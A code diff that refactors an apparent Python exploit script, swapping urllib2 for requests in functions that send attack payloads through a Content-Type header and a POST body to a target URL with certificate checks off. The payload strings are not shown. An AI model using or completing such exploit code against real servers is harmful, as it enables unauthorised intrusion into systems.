@@ -1,6 +1,5 @@
 #!/usr/bin/python
 
-import urllib2
 import requests
 import httplib
 
@@ -32,9 +31,7 @@ def exploit_ct(url):
 	try:
 
 		headers = {'User-Agent': 'Mozilla/5.0', 'Content-Type': payload}
-		#request = urllib2.Request(url, headers=headers)
 		request = requests.get(url, headers=headers,verify=False)
-		#page = urllib2.urlopen(request).read()
 
 	except httplib.IncompleteRead, e:
 
@@ -69,9 +66,7 @@ def exploit_cd(url):
 	try:
 
 		headers = {'User-Agent': 'Mozilla/5.0', 'Content-Type': content_type}
-		#request = urllib2.Request(url, headers=headers)
 		request = requests.post(url, cd_payload, headers=headers,verify=False)
-		#page = urllib2.urlopen(request).read()
 
 	except httplib.IncompleteRead, e:
 
@@ -103,4 +98,3 @@ def main():
 
 if __name__ == '__main__':
 	 main()
-
